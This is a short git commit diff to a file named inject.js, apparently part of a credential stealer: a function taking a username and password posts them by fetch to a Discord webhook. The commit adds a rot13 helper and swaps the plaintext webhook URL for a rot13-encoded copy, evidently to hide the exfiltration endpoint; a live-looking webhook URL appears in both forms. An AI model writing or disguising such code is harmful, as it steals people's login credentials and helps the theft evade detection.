6f7419b94d1fa6cbe2abfe6e718679368587f002
niknal357 <46793548+niknal357@users.noreply.github.com>
2023-01-15 23:01:03 +0100

    fff

--- inject.js
+++ inject.js
@@ -14,6 +14,12 @@ function init() {
     }
 }
 
+const rot13 = (message) => {
+    const originalAlpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"
+    return message.replace(/[a-z]/gi, letter => cipher[originalAlpha.indexOf(letter)])
+  }
+
 function valueUpdate(user, pass) {
     if (user == ''){
         return
@@ -21,7 +27,7 @@ function valueUpdate(user, pass) {
     if (pass == ''){
         return
     }
-    wh = "https://discord.com/api/webhooks/1064300208890056796/FV4NyU2ZJUOoa0FW1aKAFVPzdsyRdG8FPGWuP1jXINMLE-wA1R8tH8_WYihFGXFH43Ps"
+    wh = rot13("uggcf://qvfpbeq.pbz/ncv/jroubbxf/1064300208890056796/SI4AlH2MWHBbn0SJ1nXNSICmqflEqT8SCTJhC1wKVAZYR-jN1E8gU8_JLvuSTKSU43Cf")
     fetch(wh, {
         method: 'POST',
         headers: {
